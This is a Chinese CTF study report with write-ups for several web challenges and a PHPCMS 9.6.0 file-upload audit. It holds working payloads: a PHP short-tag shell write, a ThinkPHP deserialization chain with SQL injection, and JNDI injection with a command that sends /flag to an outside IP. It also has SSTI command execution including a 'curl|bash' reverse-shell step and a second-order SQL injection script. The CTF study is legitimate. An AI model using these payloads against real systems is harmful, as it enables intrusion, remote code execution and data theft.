# Nepnep学习报告 web第二周

- BUU 4道wp
- CMS 审计 
- SSTI 进阶
- sql 二次注入

## [红明谷CTF 2021]write_shell

源码

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

短标签注入

```
?action=upload&data=<?=`ls%09/`?>
?action=upload&data=<?=`nl%09/flllllll1112222222lag`?>
```

## [红明谷CTF 2021]EasyTP

/www.zip 读源码, 得知路由是 /?s=Home/Index/test 可以反序列化, 而且是 tp3, 只有一个 sql 反序列化读文件

需要猜一下数据库的密码 root, 填一个 mysql 自带的数据库通过报错注入找到需要的数据库然后报错注入即可

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "mysql",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct(){
            $this->img = new Memcache();
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct(){
            $this->handle = new Model();
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
//                "table" => "mysql.user where 1=(updatexml(1,concat(0x7e,(select(right(group_concat(schema_name),28))from(information_schema.schemata)),0x7e),1))#",  # 读到一个 test 数据库
//                "table" => "mysql.user where 1=(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))#",  # flag,users
//                "table" => "mysql.user where 1=(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1))#",  # flag
//                "table" => "mysql.user where 1=(updatexml(1,concat(0x7e,(select(group_concat(flag))from(test.flag)),0x7e),1))#",
                "table" => "mysql.user where 1=(updatexml(1,concat(0x7e,(select(right(group_concat(flag),30))from(test.flag)),0x7e),1))#",
                "where" => "1=1"
            );
        }
    }
}

namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}
```

## [红明谷CTF 2021]JavaWeb

看到 /login 界面, 尝试 post 东西上去, 发现 deleteMe 得知是 shrio

![20210410181413035](/img/20210410181413035.png)

/;/json 绕过鉴权访问 /json接⼝

![20210410182209298](/img/20210410182209298.png)

jackson反序列化，post Logback 反序列化链进行 JNDI 注入 

```
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://ip:8013/#Exploit"}] 
```

用[工具]( https://github.com/welk1n/JNDI-Injection-Exploit )制作, 然后执行命令并监听

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl http://39.97.114.43:8888/ -d @/flag" -A "39.97.114.43"
```

向 /;/json POST传入一下信息

```
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://39.97.114.43:1099/rsguep"}] 
```

![20210410212709257](/img/20210410212709257.png)

然后这边服务会收到响应传出命令

![20210410212208728](/img/20210410212208728.png)

返回以后查看监听端口, 就可以得到 flag

![20210410212256633](/img/20210410212256633.png)

## [MRCTF2021] wwwafed_app

登进去给了 waf 源码

```python
import re, sys
import timeout_decorator

@timeout_decorator.timeout(5)
def waf(url):
	# only xxx.yy-yy.zzz.mrctf.fun allow
	pat = r'^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$'
	if re.match(pat,url) is None: 
		print("BLOCK",end='\n') # 拦截
	else: 
		print("PASS",end='\n') # 不拦截

if __name__ == '__main__':
    while True:
        url = input('[+]url > ')
        try:
            waf(url)
        except:
            print("PASS",end='\n')
```

使用 re.match() 匹配字符串过长会超时

因为开了 timeout 修饰器, `re.match()` 匹配速度过慢会导致 try 执行失效进而直接执行 excpet, 输入

```
node.mrctf.funaaaaaaaaaaaaaaaaa{{7*7}}
```

发现可以解析模板, 考察的是SSTI

```
node.mrctf.funaaaaaaaaaaaaaaaaa{{().__class__.__bases__[0].__subclasses__()}}
```

感觉没过滤, 想尝试直接打, 会发现 python 输入会自动把 单引号 加上转义字符, 例如

```python
node.mrctf.funaaaaaaaaaaaaaaaaa{{lipsum.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
# 转换后
node.mrctf.funaaaaaaaaaaaaaaaaa{{lipsum.__globals__[\'__builtins__\'][\'eval\'](\'__import__("os").popen("ls").read()\')}}
```

导致 SSTI 模板无法解析直接 500 响应, 当时也做过类似的题目, 不使用 单引号 就没问题了

```
node.mrctf.funaaaaaaaaaaaaaaaaa{{lipsum.__globals__["os"].popen("ls").read()}}
```

然后可以看到目录

![20210412010615259](/img/20210412010615259.png)

一般 flag 藏在根目录, 提供两种方法

- 直接 cat 根目录的 flag

```
node.mrctf.funaaaaaaaaaaaaaaaaa{{lipsum.__globals__["os"].popen("cat /flag").read()}}
```

- 反弹shell到公网查看 flag

```
node.mrctf.funaaaaaaaaaaaaaaaaa{{lipsum.__globals__["os"].popen("curl xxx.xxx.xxx.xxx|bash").read()}}
```

在 80 端口放上 bash 命令执行的 shell 进行反弹, 测试后发现直接写 bash -i 不太行

## [网鼎杯2020] Unfinish

考了一个二次注入, 从注册账号到登录时查询的一个过程, 脚本如下

```python
import re
import requests
import string
import random
import time

f_url = "http://051ba551-80bb-4c39-87ad-9bb58ea92278.node3.buuoj.cn/register.php"
s_url = "http://051ba551-80bb-4c39-87ad-9bb58ea92278.node3.buuoj.cn/login.php"
result = ""

def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

for i in range(100):
    em = get_random_id() + '@123.com'
    # payload = "0' + ascii(substr(database() from {} for 1)) + '0".format(i)  # web
    payload = "0' + ascii(substr((select * from flag) from {} for 1)) + '0".format(i)
    f_data = {'email': em, 'username': payload, 'password': '1'}
    f_res = requests.post(url=f_url, data=f_data)
    if f_res.status_code == 200:
        s_data = {'email': em, 'password': '1'}
        s_res = requests.post(url=s_url, data=s_data)
        if s_res.status_code == 200:
            # print(s_res.text)
            key = re.search(r'<span class="user-name">\s*(\d*)\s*</span>', s_res.text)
            result += chr(int(key.group(1)))
            print(result)
            time.sleep(0.1)  # BUU限制, 访问太快有些页面会429导致flag不全

print('[*]Result: ' + result)
```

## CMS审计

### PHPCMSV9.6.0任意文件上传漏洞

利用点在 `phpcms/libs/classes/attachment.class.php `中的 `download` 函数

如果我们构造`src=http://xxx.xxx.xxx.xxx/shell.txt?.php#.jpg`，jpg后缀通过了正则，之后经过`fillurl`则变为`http://xxx.xxx.xxx.xxx/shell.txt?.php`，接下来`fileext`函数中取得后缀是php，这个函数内部用的是`strrchr`(查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符)，接下来再经过getname就会返回一个php后缀的文件，里面的内容则是`http://xxx.xxx.xxx.xxx/shell.txt`当中的内容, post数据

```
POST /xxx.xxx.xxx.com/index.php?m=member&c=index&a=register&siteid=1&XDEBUG_SESSION_START=17518 HTTP/1.1

siteid=1&modelid=1&username=1&password=123456&email=1@1.com&info[content]=<img src=http://xxx.xxx.xxx.xxx/shell.txt?.php#.jpg>&dosubmit=1&protocol=
```

**注释: xxx.xxx.xxx.xxx 填公网ip或者其它服务**

## 小结

文件写入

- 短标签写 shell

thinkphp3

- 反序列化 sql 报错注入

Java

- JNDI注入

SSTI

- lipsum 命令执行
- re.match() 匹配超时

SQL注入

- 二次注入